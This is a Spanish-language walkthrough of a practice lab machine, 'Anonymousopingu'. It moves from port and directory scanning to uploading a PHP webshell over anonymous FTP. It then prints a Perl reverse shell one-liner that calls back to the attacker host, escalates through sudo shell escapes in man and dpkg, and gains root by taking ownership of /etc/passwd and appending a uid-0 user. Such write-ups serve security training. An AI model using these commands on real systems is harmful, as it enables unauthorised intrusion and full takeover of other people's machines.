---
Maquina: Anonymousopingu
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - analisis_imagen
  - linux
  - escala_privs
  - ssh
  - web
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sS -Pn 172.17.0.2
```

![[Pasted image 20241024084225.png]]

2. **Ver la pagina web ubicada en el puerto 80**:

La página web para una web básica sobre una empresa genérica.

![[Pasted image 20241024085812.png]]

No hay nada muy a destacar salvo un formulario que cuando lo rellenas te devuelve al principio (no parece ni que almacene los datos).

![[Pasted image 20241024090228.png]]

Para seguir analizando el escenario en el que nos encontramos vamos a realizar un escaneo de subdirector mediante gobuster.

```bash
gobuster dir -u http://172.17.0.2 -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.py,.js,.txt
```

Pero tras analizar un poco lo que encontramos no parece que haya nada sospechoso, salvo la carpeta de uploads que por desgracia está vacía.

![[Pasted image 20241024091257.png]]

Tras investigar un poco el portal web vamos a pasar a investigar el FTP que también está activo y vamos a probar a entrar con usuario de anonymous.

![[Pasted image 20241024091349.png]]

Parece que si que tenemos acceso y se me ocurren ideas no muy agradables para la carpeta de upload... Esto pinta a una webshell de manual.

Vamos a intentar subir una webshell en PHP en la carpeta upload del FTP.

```bash
ftp 172.17.0.2 #Conexión al FTP

cd upload

put webshell.php #La web shell está en el directorio desde donde me he conectado al FTP
```

![[Pasted image 20241024092316.png]]

Vale ahora vamos a ver si la reconoce el portal web.

![[Pasted image 20241024092448.png]]

Parece que tocó premio, podemos ejecutar comandos. Ahora estaría bien hacer una reverse shell y poder trabajar desde nuestro equipo.

Para ello me voy a poner a la escucha en el puerto 4444 en el servidor atacante

```bash
nc -lvnp 4444
```

En el servidor atacado voy a intentar mandar una petición de conexión, como he estado mirando que servicios tiene al final voy a intentar realizarlo por perl.

```bash
perl -e 'use Socket;$i="172.17.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Y tras ejecutar la petición vemos lo siguiente:

![[Pasted image 20241024093207.png]]

Ya estamos dentro desde terminal, ahora si podemos pasar a la escalada de privs.

Primero vamos a comprobar los permisos con un sudo -l.

```bash
sudo -l
```

![[Pasted image 20241024093318.png]]

Como podemos observar tenemos la posibilidad de ejecutar man como root... Vamos a ver que opina gtfobins de esto.

![[Pasted image 20241024093424.png]]

Parece que esto es una ventana a escalar privilegios, pero para ello necesitamos ejecutarlo como pingu, vamos a probar.

IMPORTANTE, antes de probar hay que tener un tratamiento de TTy realizado.

```bash
sudo -u pingu man man
#luego poner /bin/bash
```

Y una vez dentro del man probar a poner

```bash
!/bin/sh
```

Esto nos debería de dar una shell con el usuario de pingu

![[Pasted image 20241024102131.png]]

Ahora vamos a ver que permisos tenemos desde el usuario de pingu con el mismo comando de antes el sudo -l

![[Pasted image 20241024102223.png]]

Pues como tenemos acceso a nmap y dpkg con el usuario gladys, vamos a intentar primero con el dpkg.

```bash
sudo -u gladys dpkg -l
#luego poner /bin/bash
```

![[Pasted image 20241024102641.png]]

Y repetimos el proceso para gladys (sudo -l)

![[Pasted image 20241024102723.png]]

Como podemos observar tenemos permisos para cambiar el dueño de cualquier archivo...

```bash
sudo chown gladys:gladys /etc/passwd

echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd

su newroot #con passwd hola123 -> openssl passwd hola123
```

![[Pasted image 20241024103859.png]]
